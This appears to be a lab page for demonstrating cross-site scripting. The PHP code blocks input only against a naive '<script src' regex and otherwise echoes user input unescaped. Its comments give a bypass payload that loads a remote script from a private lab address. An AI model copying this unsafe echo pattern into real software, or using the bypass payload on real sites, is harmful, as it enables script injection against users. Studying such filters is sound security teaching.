<!DOCTYPE html>
<html>
  <head>
    <style>
    </style>
  </head>
  <body>
    <form action="xss-filter.php" method="post">
      <input type="text" name="comment" value="">
      <input type="submit" name="submit" value="Submit">
    </form>

    <?php
      session_start();

      $re = "/<script[^>]+src/i";
      #filter: <script src="http://192.168.56.101/xss.js"></script>
      #nonfilter: <SCRIPT%20a=">"%20SRC="http://192.168.56.101/xss.js"></SCRIPT>

       if (preg_match($re, $_POST['comment']))
       {
          echo "Filtered";
          return;
       }
       else {
          echo $_POST["comment"];
       }
    ?>
  </body>
</html>
